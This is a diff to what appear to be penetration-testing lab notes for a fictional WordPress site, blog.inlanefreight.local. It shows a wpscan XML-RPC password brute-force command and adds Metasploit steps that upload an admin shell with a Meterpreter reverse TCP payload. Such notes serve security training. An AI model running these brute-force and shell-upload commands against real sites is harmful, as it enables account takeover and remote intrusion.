@@ -19,3 +19,18 @@ The `wp-login` method will attempt to brute force the standard WordPress login p
 ```
 wpscan --password-attack xmlrpc -t 20 -U john -P /usr/share/wordlists/rockyou.txt --url http://blog.inlanefreight.local
 ```
+
+### Code Execution
+
+```
+msf6 > use exploit/unix/webapp/wp_admin_shell_upload 
+
+[*] No payload configured, defaulting to php/meterpreter/reverse_tcp
+
+msf6 exploit(unix/webapp/wp_admin_shell_upload) > set rhosts blog.inlanefreight.local
+msf6 exploit(unix/webapp/wp_admin_shell_upload) > set username john
+msf6 exploit(unix/webapp/wp_admin_shell_upload) > set password firebird1
+msf6 exploit(unix/webapp/wp_admin_shell_upload) > set lhost 10.10.14.15 
+msf6 exploit(unix/webapp/wp_admin_shell_upload) > set rhost 10.129.42.195  
+msf6 exploit(unix/webapp/wp_admin_shell_upload) > set VHOST blog.inlanefreight.local
+```
